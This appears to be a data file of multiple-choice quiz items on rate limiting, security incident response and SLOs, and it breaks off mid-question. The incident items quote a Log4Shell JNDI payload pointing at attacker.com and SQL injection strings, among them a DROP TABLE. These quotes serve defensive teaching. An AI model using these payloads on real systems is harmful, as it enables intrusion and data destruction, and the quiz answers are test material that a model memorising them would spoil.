questions.situation: A sliding window log gives you exact rate limiting, but storing one timestamp per request per key blows up memory at your traffic levels. A fixed window is cheap but has the boundary burst problem. You want something close to sliding window accuracy that only keeps a couple of counters per key.
questions.code:
limit = 100 / minute
prev_window_count = 80     # requests in 11:00:00-11:00:59
curr_window_count = 30     # requests so far in 11:01:00-11:01:59
elapsed_in_curr = 15s  ->  75% of the previous minute still in view

estimate = ?
questions.question: You want sliding-window accuracy but cannot afford to store a timestamp for every request. What is the common middle-ground approach?
options: Sliding window counter: weight the previous window's count by how much of it still overlaps the trailing window, then add the current window's count (0.75 * 80 + 30 = 90)
Just use the current window count (30) and ignore the previous window entirely
Add both windows raw (80 + 30 = 110) and reject when over the limit
Store every request timestamp anyway; there is no cheaper accurate option
questions.explanation: The sliding window counter approximates a true sliding window using just two numbers per key: the previous window's count and the current window's count. You weight the previous count by the fraction of it that still falls inside the trailing window. Here 15s into the current minute, 75% of the previous minute still overlaps the last 60 seconds, so the estimate is 0.75 * 80 + 30 = 90, which is under 100, so the request is allowed. Using only the current count ignores recent history and reintroduces boundary bursts. Adding both windows raw double counts and rejects legitimate traffic. Storing every timestamp is the sliding window log you were trying to avoid.

questions.title: Two Servers, One Counter, A Race
questions.situation: You moved rate limiting to a shared Redis instance so all your app servers agree on the count. The limit is 100 per minute, but during traffic spikes you see 130+ getting through. Each server reads the counter, checks it, then writes the incremented value back.
questions.question: Your rate limiter runs on multiple app servers sharing a Redis counter. Under load it lets more requests through than the limit allows. What is wrong with this code?
options: Redis is too slow under load and is dropping writes; switch to a faster store
The expire call is being reset on every request, so the window never closes
GET-check-SET is not atomic, so concurrent servers read the same value and both pass the check. Use INCR (or a Lua script) so the read-modify-write happens atomically
The limit should be stored as a float so partial counts are tracked correctly
questions.explanation: This is a read-modify-write race. Two servers both GET 99, both see they are under 100, and both SET 100, so two requests slip through on what should have been the last slot. Multiply that across many concurrent servers and you overshoot the limit. The fix is to make the increment atomic: redis.incr(key) returns the new value in a single atomic operation, so you increment first and reject if the result exceeds the limit. For multi-step logic (like checking and conditionally setting a TTL) wrap it in a Lua script, which Redis runs atomically. Redis is not dropping writes, and the problem has nothing to do with float counts. Resetting expire on every call is a separate bug worth fixing, but it is not what lets extra requests through.

questions.title: Every Request Looks Like the Load Balancer
questions.situation: You rate limit by client IP address, reading the TCP source address of the connection. Since moving behind a load balancer and a CDN, the limiter sees only a few IPs (the proxies), so once they hit the limit, every one of your users gets throttled together. Legitimate users are getting 429s they did not earn.
questions.code:
client (1.2.3.4) -> CDN (203.0.113.10) -> load balancer (10.0.0.5) -> app

app sees remote_addr = 10.0.0.5 for ALL users
X-Forwarded-For: 1.2.3.4, 203.0.113.10
questions.question: Your per-IP rate limiter is throttling all users at once. Looking at the data, every request seems to come from a handful of IPs. Why, and how do you fix it?
options: Rate limit by the load balancer IP but raise the limit to a very high number
Key the limiter on the real client IP from a trusted proxy header like X-Forwarded-For, parsing it carefully and only trusting hops you control
Disable rate limiting whenever traffic arrives from a known proxy IP
Move rate limiting into the database layer so it sees the original client IP
questions.explanation: Behind a proxy, the TCP source address is the proxy, not the user, so keying on it lumps everyone into one bucket. The real client IP is carried in a forwarding header such as X-Forwarded-For (or Forwarded). Key the limiter on that, but parse it safely: the header is a comma separated list that clients can spoof, so only trust the entries added by proxies you actually control, typically by counting a known number of trusted hops from the right. Just raising the limit on the proxy IP still throttles everyone together once it is hit. Disabling limits for proxy traffic removes protection entirely, and the database does not see the original IP any more than the app does.

questions.title: Clients Flying Blind Into the Limit
questions.situation: Your API returns a clean 429 when clients exceed their quota, but partners complain they cannot tell they are getting close until they are already blocked. They want to throttle themselves proactively instead of discovering the limit by hitting it.
questions.code:
$ curl -i https://api.example.com/v1/search
HTTP/1.1 200 OK
content-type: application/json
# no rate limit information anywhere in the response
questions.question: Well-behaved clients keep slamming into your rate limit because they have no idea how much budget they have left. What do you add to the response?
options: Nothing; clients should track their own request counts locally
Put the remaining quota in the JSON response body only, so it does not clutter the headers
Email partners a weekly report of their API usage
Return RateLimit-Limit, RateLimit-Remaining, and RateLimit-Reset headers on every response so clients can see their budget and self-throttle
questions.explanation: Surfacing the limit, remaining budget, and reset time on every response (commonly RateLimit-Limit / RateLimit-Remaining / RateLimit-Reset, plus Retry-After on a 429) lets good clients pace themselves before they ever get blocked. Headers are the right place because they ride along with every response without the client having to parse the body of each call, and existing tooling and SDKs already look for them. Telling clients to track their own counts is fragile, because they cannot see server-side state like shared quotas or other instances. Burying the data in the body only works if every endpoint returns it consistently and the client parses every response. A weekly email is far too slow to drive real-time throttling.

questions.title: When the Rate Limiter's Backend Goes Down
questions.situation: Your rate limiter checks a shared Redis cluster on every request. Redis has a blip and the limiter code throws an exception, which bubbles up and turns into a 500 for the caller. A short Redis hiccup just took your entire public API down, even though the backends were healthy.
questions.question: Your Redis-backed limiter cannot reach Redis and right now every API request fails. What is usually the better default, and what is the tradeoff?
options: Fail open: if the limiter backend is unreachable, allow the request (but log and alarm on it) so a limiter outage does not take down the whole API
Fail closed: reject every request until Redis recovers, because the correctness of the limit matters most
Retry the Redis call in a tight loop until it finally succeeds
Cache the last known counter in memory forever and never expire it
questions.explanation: For most public APIs the rate limiter is a guardrail, not the product, so the common default is to fail open: if you cannot reach the backend, allow the request but log and alert loudly so you know you are running unprotected. The tradeoff is that during the outage clients can exceed their limits, so you pair it with small local in-process fallback limits to cap the blast radius. Failing closed turns a dependency blip into a full outage, which is usually worse than briefly under-enforcing limits. A tight retry loop ties up workers and can make the Redis incident worse. Caching a counter forever drifts out of sync and silently mis-enforces limits. The right choice does depend on context: a limiter guarding a paid metering boundary or an abuse-prone endpoint may deliberately fail closed.

questions.title: Ten Nodes, Ten Limiters, One Big Overshoot
questions.situation: You run 10 API nodes behind a load balancer. Each one keeps its own in-memory token bucket of 100 requests per minute per key, because in-memory is fast and simple. A single client whose requests spread across all 10 nodes can now do 1000 per minute, 10x your intended global limit.
questions.code:
intended global limit: 100 req/min per key

node-1  local bucket: 100/min
node-2  local bucket: 100/min
...
node-10 local bucket: 100/min
-------------------------------
effective limit a client can reach: ~1000/min
questions.question: Each API node enforces the limit locally, and together they allow far more than you intended. How should global rate limiting actually work?
options: Lower each node's local limit to 100 divided by the node count and never touch it again
Pin every client to a single node with sticky sessions so only one limiter ever counts
Track the count in a shared store (like Redis) so all nodes enforce one global counter, accepting the added latency, or hand each node a slice of a global budget and rebalance
Accept the 10x overshoot; accurate distributed rate limiting is impossible
questions.explanation: Local-only limiters multiply by the number of nodes, so a per-node limit of 100 across 10 nodes is really a 1000 global limit. The straightforward fix is a shared counter in a fast central store such as Redis, so every node increments and checks the same number and the global limit holds, at the cost of a network round trip per request. At very high scale, teams instead distribute the global budget across nodes (each gets a slice) and rebalance periodically to cut that round trip. Dividing the static limit by node count breaks the moment you autoscale and assumes traffic splits perfectly evenly, which it never does. Sticky sessions hurt load balancing and still miss requests that land elsewhere on failover. The overshoot is very much solvable, just not with independent local counters.

questions.title: A Token Bucket That Refills on a Timer
questions.situation: A teammate implemented a token bucket with a background thread that adds tokens on a timer. Under load it sometimes refills late, clients see uneven behavior after idle gaps, and the background thread does not scale to millions of keys. You want a refill approach that needs no timer thread and stays exact.
questions.question: This token bucket refills with a background thread, but it leaks capacity and behaves oddly after idle periods. What is the better refill design?
options: Add more refill threads and shard the keys across them
Refill lazily on read: store tokens plus a last-updated timestamp, and on each request compute tokens = min(capacity, tokens + (now - last_updated) * rate) before spending one
Refill the bucket back to full on every request so clients never run dry
Drop the timestamp and just decrement a fixed counter that resets every minute
questions.explanation: The scalable, exact way to run a token bucket is lazy refill: store the current token count and the timestamp of the last update, and whenever a request arrives, compute how many tokens should have accrued in the elapsed time, cap at the bucket size, then try to spend one. No background thread, no per-key timer, and it stays correct across long idle gaps because the math is based on real elapsed time rather than how often a thread happened to run. Adding more threads just scales the broken design and still drifts when ticks run late. Refilling to full on every request removes the limit entirely. Resetting a fixed counter each minute is a fixed window wearing a token bucket costume and brings back the boundary burst problem. In Redis this lazy computation is typically done inside a Lua script so the read, refill, and spend are atomic.

questions.title: Everyone Retries at the Exact Same Second
questions.situation: Your limiter returns Retry-After with the exact seconds until the fixed window resets. Thousands of clients get throttled in the same window, all read the same Retry-After value, and all retry at the same instant when it elapses. The result is a synchronized thundering herd that spikes load every reset and can knock the service over.
questions.code:
11:00:30  3000 clients get 429, Retry-After: 30
11:01:00  window resets
11:01:00  all 3000 clients retry simultaneously   <-- synchronized spike
11:01:00  load spike -> more 429s -> repeat next window
questions.question: After a burst of 429s, all your clients come back at once the instant the window resets, spiking load. What fixes this retry storm?
options: Lower the rate limit so fewer clients get 429s in the first place
Remove the Retry-After header so clients stop synchronizing on the same value
Switch the server from a fixed window to a leaky bucket and change nothing else
Add randomized jitter to Retry-After, and have clients retry with exponential backoff plus jitter, so retries spread out instead of landing on the same instant
questions.explanation: The herd is synchronized because every client receives the same reset time and retries at that exact moment. Spreading the retries out breaks the synchronization: add random jitter to the Retry-After you return (for example the base wait plus a random spread), and on the client side use exponential backoff with jitter rather than retrying at a fixed instant. Lowering the limit does not unsynchronize anything; the survivors still retry together. Removing Retry-After makes clients guess, and many HTTP libraries then retry immediately, which is worse. Moving to a leaky bucket changes how the server admits traffic but does nothing about thousands of clients all waking up on the same second unless you also de-synchronize the retries. Jitter is the cheap, standard fix for thundering herds.

questions.title: One Limit for Cheap and Expensive Calls Alike
questions.situation: Your API has a 600 requests-per-minute limit per key. One endpoint is a cached key lookup that costs almost nothing; another runs a heavy aggregation that pegs a database CPU for a second. Clients hammering the expensive endpoint stay under 600/min but still overload the backend, while clients doing cheap lookups feel unfairly restricted by the same number.
questions.code:
GET  /v1/lookup     -> cheap   (cost: 1 token)
POST /v1/report     -> heavy   (cost: 25 tokens)

flat limit: 600 requests/min, every endpoint counted equally
problem: 600 heavy reports/min melts the DB; 600 cheap lookups/min is nothing
questions.question: A flat request-per-minute limit treats a trivial lookup and an expensive report the same. How do you limit by actual cost instead?
options: Add a separate fixed window counter for every endpoint and tune them independently forever
Rate limit only the expensive endpoint and leave everything else unlimited
Use weighted (cost-based) rate limiting: give each key a token budget and charge each endpoint a number of tokens proportional to its real cost, so one budget reflects actual load
Raise the global limit so cheap-endpoint users stop hitting it, and accept the database risk from the heavy calls
questions.explanation: A flat request count is the wrong unit when requests vary wildly in cost. Weighted or cost-based rate limiting fixes the unit: each key gets a budget of tokens per window, and every endpoint deducts an amount proportional to the work it causes (1 for a cached lookup, 25 for a heavy aggregation). Now a single budget protects the backend by actual load while still letting clients make thousands of cheap calls. This maps cleanly onto a token bucket where different requests spend different numbers of tokens. Per-endpoint counters multiply your configuration surface and still do not stop a client from hitting many expensive endpoints at once. Limiting only the costly endpoint leaves gaps and is brittle as the API grows. Raising the global limit makes the database risk worse, not better.

questions.title: Suspicious Login Activity Detected
questions.situation: At 3 AM, you receive alerts about 50+ failed login attempts on admin accounts, followed by 3 successful logins from IP addresses in different countries. The successful logins are accessing sensitive customer data.
questions.code:
Security Logs:
[03:15] FAILED_LOGIN admin@company.com from 185.220.101.45 (Russia)
[03:16] FAILED_LOGIN admin@company.com from 185.220.101.45 (Russia)
... 48 more failed attempts ...
[03:22] SUCCESS_LOGIN admin@company.com from 185.220.101.45 (Russia)
[03:23] DATA_ACCESS customer_database by admin@company.com
[03:24] DATA_EXPORT 10,000 records by admin@company.com
[03:25] SUCCESS_LOGIN admin2@company.com from 203.0.113.27 (China)

- Data accessed: Customer PII database
- Time since first alert: 15 minutes
questions.question: Your monitoring system flags unusual authentication patterns from admin accounts.
options: Wait until morning to investigate during business hours
Immediately disable compromised accounts, force password resets, start incident response
Block the IP addresses and continue monitoring
Send an email to the admin users asking if it was them
questions.explanation: This is an active security breach. Immediate action is critical: 1) Disable compromised accounts to stop ongoing data access, 2) Preserve forensic evidence, 3) Activate incident response team, 4) Assess scope of breach, 5) Notify stakeholders. Waiting or just blocking IPs allows continued unauthorized access. Every minute counts when data is being exfiltrated.

questions.title: Ransomware Detected on Production Servers
questions.situation: Your EDR system alerts that 5 production servers are executing suspicious encryption processes. File extensions are being changed to .locked and a README.txt appears demanding 10 Bitcoin payment within 48 hours.
questions.code:
Alert Details:
[CRITICAL] Ransomware detected on prod-server-01 through prod-server-05
[CRITICAL] Mass file encryption in progress
[CRITICAL] Lateral movement detected

Ransom Note Content:
'Your files have been encrypted. Pay 10 BTC to wallet:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa within 48 hours
or files will be permanently deleted. Decryption key
will be provided after payment.'

Current Status:
- Encrypted files: ~40% of production data
- Spread rate: 2 servers/minute
- Backups: Last backup 6 hours ago
- Network: Still connected
questions.question: Multiple servers show signs of ransomware encryption with a ransom note demanding payment.
options: Pay the ransom immediately to recover the files quickly
Restart the servers and run antivirus scans
Isolate affected systems, disconnect network, activate IR plan, assess backup integrity
Negotiate with the attackers for a lower ransom amount
questions.explanation: Never pay ransoms - it funds criminals and doesn't guarantee recovery. Critical steps: 1) Immediately isolate infected systems to prevent spread, 2) Disconnect from network but preserve forensics, 3) Activate incident response team, 4) Verify backup integrity and test restoration, 5) Identify attack vector, 6) Report to law enforcement. Paying ransoms is discouraged by FBI/CISA and may be illegal in some jurisdictions.

questions.title: Active SQL Injection Attack
questions.situation: Your Web Application Firewall shows 1000+ SQL injection attempts in the last 10 minutes from multiple IPs. Some queries are bypassing validation and reaching your database.
questions.code:
WAF Logs:
[HIGH] SQL Injection: ' OR '1'='1 from 192.0.2.15
[HIGH] SQL Injection: '; DROP TABLE users-- from 192.0.2.88
[HIGH] SQL Injection: ' UNION SELECT * FROM passwords-- from 198.51.100.42
[CRITICAL] Bypass detected: Query executed on database

Application Logs:

[WARN] Unusual query pattern detected
[ERROR] Multiple table access from single request

Database Activity:
- Query volume: 10x normal
- Failed queries: 95%
- Successful malicious queries: ~50
- Data exposure: Possible
questions.question: WAF is detecting coordinated SQL injection attempts targeting your database.
options: Block the attacking IP addresses in the firewall
Enable WAF strict mode, review query logs for data exposure, patch vulnerable code, rotate credentials
Disable the affected endpoint temporarily
Add rate limiting to slow down the attacks
questions.explanation: Multi-layered response needed: 1) Immediately enable WAF strict mode to block attacks, 2) Review logs to determine if data was exposed, 3) Identify and patch vulnerable input validation, 4) Rotate database credentials in case they were exposed, 5) Consider taking affected services offline if breach confirmed, 6) Implement prepared statements/parameterized queries. Just blocking IPs is ineffective against distributed attacks.

questions.title: Suspected Insider Data Theft
questions.situation: HR notified you that a senior engineer submitted their resignation yesterday. Today, access logs show this user downloaded 50GB of proprietary code, customer databases, and internal documents to a personal device.
questions.code:
Access Audit Log:
[09:30] user: john.doe - Downloaded: customer_database.sql (5GB)
[09:45] user: john.doe - Downloaded: proprietary_algorithm.zip (2GB)
[10:15] user: john.doe - Downloaded: financial_reports_2024.zip (500MB)
[10:30] user: john.doe - Cloned: all-repositories (42GB)
[10:45] user: john.doe - Accessed: competitor_analysis_internal.pdf

User Status:

- Access level: High (Admin on 5 systems)
- Resignation date: Yesterday
- Last day: 2 weeks from now
- Known fact: Joining competitor next month
questions.question: An employee with access privileges is downloading large amounts of sensitive data before their resignation.
options: Confront the employee directly and ask them to return the data
Wait until their last day and then revoke access
Monitor their activity closely for the next 2 weeks
Immediately revoke access, preserve evidence, engage legal team, notify management
questions.explanation: This is a clear insider threat with potential IP theft. Immediate action: 1) Revoke all system access immediately, 2) Preserve detailed audit logs and evidence, 3) Engage legal counsel and HR, 4) Consider security escort and early termination, 5) Send preservation letter demanding return of data, 6) Review what data was accessed for damage assessment. Delay risks further data exfiltration and competitive harm.

questions.title: Distributed Denial of Service Attack
questions.situation: At 10 AM during peak business hours, your website becomes unreachable. Traffic logs show 1 million requests per minute from 50,000+ unique IPs worldwide. Legitimate customer complaints are flooding in.
questions.code:
Traffic Analysis:
- Incoming requests: 1,000,000/min (normal: 5,000/min)
- Unique IPs: 50,000+ from 150 countries
- Request pattern: Identical user agents, rapid fire
- Target: Homepage and API endpoints
- Server status: CPU 100%, Memory 98%, Network saturated

Sample Requests:
GET / HTTP/1.1 from 203.0.113.* (repeated 1000x)
POST /api/search HTTP/1.1 (crafted to be resource intensive)

Business Impact:
- Website: Completely unavailable
- Revenue loss: $50,000/hour
- Customer complaints: 500+ in last 10 minutes
questions.question: Your website is receiving massive traffic from thousands of IPs, making it unavailable to legitimate users.
options: Enable DDoS protection (CDN/Cloudflare), implement rate limiting, geo-blocking, work with ISP
Increase server capacity by adding more instances
Block all international traffic
Take the website offline until the attack stops
questions.explanation: Effective DDoS mitigation requires multiple layers: 1) Activate DDoS protection service (CDN/Cloudflare) to absorb attack traffic, 2) Implement rate limiting and connection limits, 3) Use geo-blocking if attack source is concentrated, 4) Work with ISP for upstream filtering, 5) Enable caching for static content, 6) Consider temporary captcha for verification. Simply scaling up is expensive and ineffective. Taking site offline lets attackers win.

questions.title: API Keys Exposed in Public Repository
questions.situation: GitHub's secret scanning alerted you that AWS access keys with admin privileges were pushed to a public repo 2 hours ago. CloudTrail shows unusual API activity from unknown IPs.
questions.code:
GitHub Alert:

Repository: company/web-app (PUBLIC)
File: config/production.env
Exposed: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
         AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Commit time: 2 hours ago
Repo views: 47 in last 2 hours

CloudTrail Activity:
[14:30] EC2.RunInstances from IP 185.220.101.55 (Unknown)
[14:35] S3.ListBuckets from IP 185.220.101.55
[14:40] IAM.CreateUser from IP 185.220.101.55
[14:45] Lambda.CreateFunction (crypto-miner) from IP 185.220.101.55

Estimated cost exposure: $15,000 and growing
questions.question: A developer accidentally committed AWS credentials to a public GitHub repository.
options: Delete the commit from Git history and hope no one saw it
Contact GitHub support to delete the repository
Immediately revoke credentials, audit all API activity, rotate all keys, remove commit, scan for damage
Change the repository to private
questions.explanation: Exposed credentials are compromised immediately by automated scanners. Critical steps: 1) IMMEDIATELY revoke exposed credentials to stop ongoing abuse, 2) Audit CloudTrail for all unauthorized activity, 3) Terminate unauthorized resources (EC2 instances, Lambda functions), 4) Rotate ALL credentials (assume lateral movement), 5) Remove sensitive data from Git history using BFG/git-filter-repo, 6) Enable AWS secret scanning, 7) Implement secrets management solution. Every second counts as crypto miners cost thousands per hour.

questions.title: Targeted Phishing Campaign Against Employees
questions.situation: Your security team detects a sophisticated spear-phishing campaign. 50 employees received emails appearing to be from IT, asking them to verify their credentials. 8 employees clicked the link and entered credentials on a fake login page.
questions.code:
Email Analysis:
From: it-support@cornpany.com (note typo)
Subject: [URGENT] Verify your account to prevent suspension
Body: 'Your account will be suspended in 24 hours unless
you verify your credentials at: https://company-login-verify.com'

Link analysis:
- Domain: company-login-verify.com (registered 2 days ago)
- Certificate: Valid SSL (Let's Encrypt)
- Page: Exact replica of company login

Compromised accounts:
- 8 employees entered credentials
- 3 clicked but didn't enter credentials  
- Accounts include: 2 developers, 1 HR manager, 5 sales reps
- Time since compromise: 30 minutes
questions.question: Multiple employees received convincing phishing emails, and some have entered their credentials.
options: Send a company-wide email warning about the phishing attempt
Force password reset for affected users, enable MFA, review access logs, run security training
Block the phishing domain in your email filter
Report the phishing domain to the registrar
questions.explanation: Rapid response to credential compromise: 1) Immediately force password reset for all 8 affected accounts, 2) Enable/enforce MFA on all accounts, 3) Review access logs for unauthorized activity using compromised credentials, 4) Check for lateral movement or data access, 5) Block phishing domain and add email filters, 6) Conduct security awareness training, 7) Monitor for follow-up attacks. Just warning others or blocking domain doesn't secure already-compromised accounts.

questions.title: Zero-Day Exploit in Production Software
questions.situation: CISA just published an emergency directive about a critical RCE (Remote Code Execution) vulnerability in Apache Log4j. Your team confirms you're running affected versions in 20+ production services. Active exploitation is detected in the wild.
questions.code:
Vulnerability Details:
CVE-2021-44228 (Log4Shell)
Severity: CRITICAL (CVSS 10.0)
Affected: Apache Log4j 2.0-beta9 to 2.14.1
Exploit: ${jndi:ldap://attacker.com/a} in logs triggers RCE
Public exploit: Available
Active scanning: Detected worldwide

Your Environment:
- 20 production services using Log4j 2.13.0
- Public-facing: 8 services
- Critical data access: 12 services
- Patch availability: Yes (Log4j 2.15.0)
- Deployment time: 2-4 hours per service

Threat Intel:
- Mass scanning started 4 hours ago
- Ransomware gangs actively exploiting
- Your IPs not yet scanned (luck)
questions.question: A critical zero-day vulnerability is announced for software you're running in production.
options: Emergency patch deployment, enable WAF rules, isolate critical services, hunt for IoCs
Wait for security team to test patches before deploying
Schedule maintenance window for next week to patch properly
Disable logging temporarily until patches are ready
questions.explanation: Critical zero-days require emergency response: 1) Immediately deploy patches to public-facing services (hours matter), 2) Enable WAF/IPS rules to block known exploit patterns, 3) Isolate critical services from internet if patching takes time, 4) Hunt for indicators of compromise (IoCs) in logs, 5) Monitor for exploitation attempts, 6) Set up detection rules. With CVSS 10.0 and active exploitation, waiting is not an option. Every hour of delay increases breach risk exponentially.

questions.title: Customer Data Breach - Legal Obligations
questions.situation: After investigation, you've confirmed attackers accessed customer database containing 100,000 email addresses, bcrypt hashed passwords, and names. Breach occurred 5 days ago. You're in the US and have EU customers.
questions.code:
Breach Assessment:
Data exposed:
- Email addresses: 100,000
- Names: 100,000
- Hashed passwords: 100,000 (bcrypt, cost 12)
- No SSN, credit cards, or financial data

Breach timeline:
- Initial compromise: 5 days ago
- Detection: Today
- Containment: Today

Regulatory requirements:
- GDPR (EU): 72-hour notification to DPA
- California (CCPA): Notification without unreasonable delay
- Other US states: Various timelines

Affected users:
- US users: 70,000
- EU users: 25,000
- Other: 5,000
questions.question: You've confirmed a breach exposing 100,000 customer email addresses and hashed passwords.
options: Wait until you have complete information before notifying anyone
Only notify EU customers since GDPR has strict requirements
Handle it internally and only notify if passwords are cracked
Notify data protection authorities immediately, prepare customer notifications, engage legal counsel
questions.explanation: Breach notification is legally mandated: 1) Immediately notify data protection authorities (GDPR 72-hour deadline already at risk), 2) Prepare customer notifications (required by GDPR, CCPA, and state laws), 3) Engage legal counsel for regulatory compliance, 4) Document breach details and response, 5) Offer credit monitoring if appropriate, 6) File required regulatory reports. Failure to notify can result in massive fines (GDPR: up to €20M or 4% revenue). Hashed passwords still constitute a breach requiring notification.

questions.title: Malware Detected on Corporate Endpoints
questions.situation: Your EDR system flags malware infections on 15 laptops across different departments. Network analysis shows these machines are uploading data to an external server. Malware appears to be keylogger with data theft capabilities.
questions.code:
EDR Alert:
[CRITICAL] Malware detected: InfoStealer.Variant
Affected systems: 15 endpoints
Behavior observed:
- Keylogger active
- Screenshot capture
- Browser credential theft
- Data exfiltration to 203.0.113.99

Network Traffic:
- Destination: 203.0.113.99:443 (Russia)
- Data uploaded: 2.5GB total
- Connections: Persistent (every 5 minutes)
- Encrypted: Yes (custom protocol)

Affected Users:
- Finance team: 5 users
- Development team: 7 users
- HR team: 3 users
- Infection source: Unknown
- Time infected: Estimated 3-5 days
questions.question: EDR detected malware on 15 employee laptops with indicators of data exfiltration.
options: Run antivirus scans on all affected machines
Have users restart their computers to clear the infection
Immediately isolate infected systems, force credential resets, analyze exfiltrated data, image systems for forensics
Block the external IP address and monitor for further activity
questions.explanation: Malware with data exfiltration requires aggressive response: 1) Immediately network-isolate infected systems (prevent further data theft), 2) Force password resets for all affected users (keylogger captured credentials), 3) Analyze what data was exfiltrated (2.5GB could be sensitive docs, code, credentials), 4) Take forensic images before remediation, 5) Identify infection vector to prevent reinfection, 6) Scan all systems for same IoCs, 7) Review access logs for compromised credentials. Antivirus scanning alone won't secure already-stolen credentials.

questions.quizTitle: SLOs, SLIs, and Error Budgets Quiz
questions.title: SLI vs SLO vs SLA
questions.situation: Your company signed a contract with an enterprise customer promising 99.95% uptime. Your internal reliability target is 99.99%. You measure actual availability from load balancer access logs.
questions.code:
Contract clause:
  "Provider guarantees 99.95% monthly uptime.
   Breach results in 10% service credit."

Internal target: 99.99% availability

Prometheus query:
  sum(rate(http_requests_total{code!~"5.."}[30d]))
  /
  sum(rate(http_requests_total[30d]))
questions.question: Which statement correctly describes the relationship between SLIs, SLOs, and SLAs in this scenario?
options: The Prometheus query is the SLO, 99.99% is the SLI, and 99.95% is the SLA
The Prometheus query is the SLI, 99.99% is the SLO, and the contract with its penalty clause is the SLA
The Prometheus query is the SLA, 99.95% is the SLO, and 99.99% is the SLI
The contract is the SLO, 99.99% is the SLA, and the Prometheus query is the SLI
questions.explanation: An SLI (Service Level Indicator) is the measurement itself, like the ratio of successful requests. An SLO (Service Level Objective) is your internal target for that measurement, here 99.99%. An SLA (Service Level Agreement) is a contract with consequences for missing the target, here the 99.95% uptime promise with service credits. SLOs should always be stricter than SLAs so you have a buffer before contractual penalties kick in.

questions.quizTitle: SLOs, SLIs, and Error Budgets Quiz
questions.title: Picking the Right SLI
questions.situation: You run a payment processing API. Users submit charges and expect a quick response. Lately, support tickets complain about 'slow payments' even though your uptime dashboard shows 99.99%. You need to pick a better SLI.
questions.code:
Current monitoring:
  uptime_check: ping /healthz every 60s
  result: 99.99% uptime

Support tickets (last 7 days):
  - "Payment took 12 seconds, customer left"
  - "Timeout on checkout page"
